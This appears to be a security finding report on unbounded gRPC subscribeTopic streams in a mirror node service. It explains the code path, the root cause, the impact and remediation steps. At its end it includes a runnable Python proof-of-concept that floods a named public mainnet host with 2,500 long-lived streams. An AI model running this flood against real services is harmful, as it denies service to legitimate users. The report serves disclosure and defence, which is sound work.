### Title
Unbounded Concurrent gRPC Subscriptions Enable Resource Exhaustion DoS via `subscribeTopic()`

### Summary
The `subscribeTopic()` method in `ConsensusController` accepts and processes every incoming subscription request with no per-IP connection limit, no global subscription cap, and no authentication requirement. An unprivileged attacker can open an arbitrary number of TCP connections to the gRPC port, each carrying up to 5 concurrent `subscribeTopic` streams (the only enforced limit, which is per-connection), exhausting the shared thread pool, database connection pool, and memory, and preventing legitimate clients from receiving topic message confirmations.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) unconditionally creates a new reactive subscription pipeline for every request:

```java
public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
    final var disposable = Mono.fromCallable(() -> toFilter(request))
            .flatMapMany(topicMessageService::subscribeTopic)
            ...
            .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
    ...
}
``` [1](#0-0) 

`TopicMessageServiceImpl.subscribeTopic()` tracks the count via `subscriberCount` (an `AtomicLong`) but **only as a Prometheus gauge metric** — it is never compared against any threshold to reject new subscriptions:

```java
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
``` [2](#0-1) 

**The only server-side concurrency control** is `maxConcurrentCallsPerConnection = 5`, configured in `GrpcConfiguration`:

```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
``` [3](#0-2) 

This is set to 5 by default: [4](#0-3) 

**Root cause:** `maxConcurrentCallsPerConnection` limits calls *per TCP connection*, not per IP and not globally. There is no call to `maxInboundConnections()` on the `NettyServerBuilder`, so the number of inbound TCP connections is unbounded. An attacker opens N connections × 5 subscriptions = N×5 total active subscriptions with no server-side rejection.

**Why the `subscriberCount` check fails:** It is wired only to a Micrometer `Gauge` for observability. No code path reads it to enforce a ceiling before accepting a new subscription. [5](#0-4) 

**No gRPC-layer rate limiting exists** in the `grpc` module. The `ThrottleConfiguration` and `ThrottleManagerImpl` with Bucket4j rate limiting exist only in the `web3` module and are not applied here.

Each accepted subscription allocates: a `TopicContext` object, a Reactor `Flux` pipeline, a `safetyCheck` task on `Schedulers.boundedElastic()`, a Redis listener registration or polling task, and potential database queries consuming HikariCP connections.

### Impact Explanation

When the attacker's subscriptions saturate the `applicationTaskExecutor` thread pool (used as the gRPC executor per `serverBuilder.executor(applicationTaskExecutor)`), new legitimate `subscribeTopic` calls queue indefinitely or are rejected. Simultaneously, HikariCP database connections are exhausted by the flood of retriever queries spawned per subscription, which is already monitored as a critical alert at 75% utilization. The result is a complete denial of topic message delivery to all legitimate clients — no transaction confirmations can be streamed — matching the "total network shutdown" severity classification. [6](#0-5) 

### Likelihood Explanation

No authentication, API key, or account is required to call `subscribeTopic`. The gRPC port (5600) is publicly exposed. A single attacker machine can open thousands of TCP connections using standard gRPC client libraries (e.g., `grpc-java`, `grpcurl`, Python `grpcio`) and issue 5 streaming calls per connection. This requires no special knowledge beyond the published proto definition. The attack is repeatable and self-sustaining as long as the attacker holds the connections open (which the nginx proxy allows for up to 600 seconds per the `grpc_read_timeout` setting). [7](#0-6) 

### Recommendation

1. **Enforce a global subscription ceiling**: Read `subscriberCount` before accepting a new subscription in `TopicMessageServiceImpl.subscribeTopic()` and throw a `StatusRuntimeException(Status.RESOURCE_EXHAUSTED)` when the count exceeds a configurable maximum.

2. **Add `maxInboundConnections` to the Netty server builder** in `GrpcConfiguration` to cap the total number of TCP connections server-wide.

3. **Add per-IP connection tracking** via a gRPC `ServerInterceptor` that counts active connections per remote address and rejects new ones above a threshold.

4. **Expose `maxGlobalSubscriptions` and `maxSubscriptionsPerIp`** as configurable properties in `GrpcProperties`/`NettyProperties`, consistent with the existing `maxConcurrentCallsPerConnection` pattern.

### Proof of Concept

```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror.mainnet.hedera.com:443"
CONNECTIONS = 500   # open 500 TCP connections
STREAMS_PER_CONN = 5  # 5 streams each = 2500 total subscriptions

def flood(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1)
    )
    streams = []
    for _ in range(STREAMS_PER_CONN):
        # Each call opens a long-lived server-streaming RPC
        streams.append(stub.subscribeTopic(query))
    # Hold all streams open indefinitely
    for s in streams:
        for _ in s:
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads:
    t.start()
# Legitimate clients now receive RESOURCE_EXHAUSTED or hang indefinitely
```

Preconditions: Network access to gRPC port 5600 (or 443 via proxy). No credentials needed.
Trigger: Run the script. Within seconds, `subscriberCount` metric spikes, `applicationTaskExecutor` queue fills, and HikariCP active connections approach maximum.
Result: All subsequent legitimate `subscribeTopic` calls time out or are rejected; topic message confirmations cease.
